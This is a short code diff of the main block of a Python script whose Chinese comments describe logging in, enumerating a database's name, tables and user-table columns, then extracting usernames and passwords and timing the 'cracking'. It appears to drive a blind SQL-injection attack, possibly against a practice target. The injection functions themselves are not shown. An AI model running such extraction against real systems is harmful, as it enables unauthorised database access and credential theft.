@@ -133,12 +133,15 @@ def get_use_name_password(cookies):
 if __name__ == '__main__':
     #get_table_count()
     # 模拟login 获取响应 cookies
+    startTime = time.time()
     cookies = loginUtil.login(LOGIN_URL, body, headers)
     # 通过cookies做后续测试
     # 获取database name
-    #get_date_base_name(cookies, get_data_base_name_length(cookies))
+    get_date_base_name(cookies, get_data_base_name_length(cookies))
     # 获取各表名
-    # get_table_name_length_each_table(cookies,get_table_count(cookies))
+    get_table_name_length_each_table(cookies,get_table_count(cookies))
     # 获取users 表字段
-    # get_user_table_column_length(cookies,get_column_count(cookies));
-    get_use_name_password(cookies);
+    get_user_table_column_length(cookies,get_column_count(cookies));
+    # 获取用户名和密码
+    get_use_name_password(cookies)
+    print("破解耗时:",time.time() - startTime,"秒")
